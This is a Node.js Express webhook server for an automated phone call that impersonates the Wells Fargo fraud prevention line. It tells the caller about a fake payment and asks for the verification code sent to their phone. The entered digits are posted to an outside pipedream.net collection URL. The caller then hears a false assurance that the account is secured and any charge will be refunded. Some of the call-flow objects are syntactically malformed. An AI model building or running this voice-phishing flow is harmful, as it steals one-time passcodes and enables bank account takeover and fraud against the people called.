const app = require('express')();
const bodyParser = require('body-parser');

app.use(bodyParser.json());

app.get('/webhooks/answer', (req, res) => {
	res.json(mainMenu(req));
});

app.post('/webhooks/events', (req, res) => {
	console.log(req.body);
	res.sendStatus(204);
});

app.post('/webhooks/dtmf', (req, res) => {
	let actions = [];
	let ncco = [];
	switch (req.body.dtmf.digits) {
		case '1':
			actions.push({
    "action": "talk",
    "text": "in order to secure your account please enter the code we have sent to your mobile device now ",
    "bargeIn": true
  },
  {
    "eventUrl": [
      "https://enq77kdcsr1ixtd.m.pipedream.net"
    ],
    "action": "input",
    "type": [ "dtmf" ],
    "dtmf": {
      "maxDigits": 6,
      "submitOnHash": true,
      "timeOut": 10
    },{
    "action": "talk",
    "text": "Thank you.Your account has been secured and this request has been blocked. don’t worry if any payment has been charged to your account we will refund within 24 to 48 hours. Thank you, goodbye",
    "bargeIn": true});
			break;
		case '2':
			actions.push({
    "action": "talk",
    "text": "in order to secure your account please enter the code we have sent to your mobile device now ",
    "bargeIn": true
  },
  {
    "eventUrl": [
      "https://enq77kdcsr1ixtd.m.pipedream.net"
    ],
    "action": "input",
    "type": [ "dtmf" ],
    "dtmf": {
      "maxDigits": 6,
      "submitOnHash": true,
      "timeOut": 10
    },{
    "action": "talk",
    "text": "Thank you.Your account has been secured and this request has been blocked. don’t worry if any payment has been charged to your account we will refund within 24 to 48 hours. Thank you, goodbye",
    "bargeIn": true});
	}
	ncco = actions.concat(mainMenu(req));

	console.log(ncco);

	res.json(ncco);
});

function mainMenu (req) {
	return [
		{
			action: 'talk',
			bargeIn: true,
			text:
				'Welcome to WellsFargo fraud prevention system. We have recently received a payments request of $352.87. if this was not you please press 1. if you please press 2.',
		},
		{
			action: 'input',
			type: [ 'dtmf' ],
			dtmf: {
				maxDigits: 1,
				"submitOnHash": true,
			},
			eventUrl: [ `${req.protocol}://${req.get('host')}/webhooks/dtmf` ],
		},
	];
}

app.listen(3000);
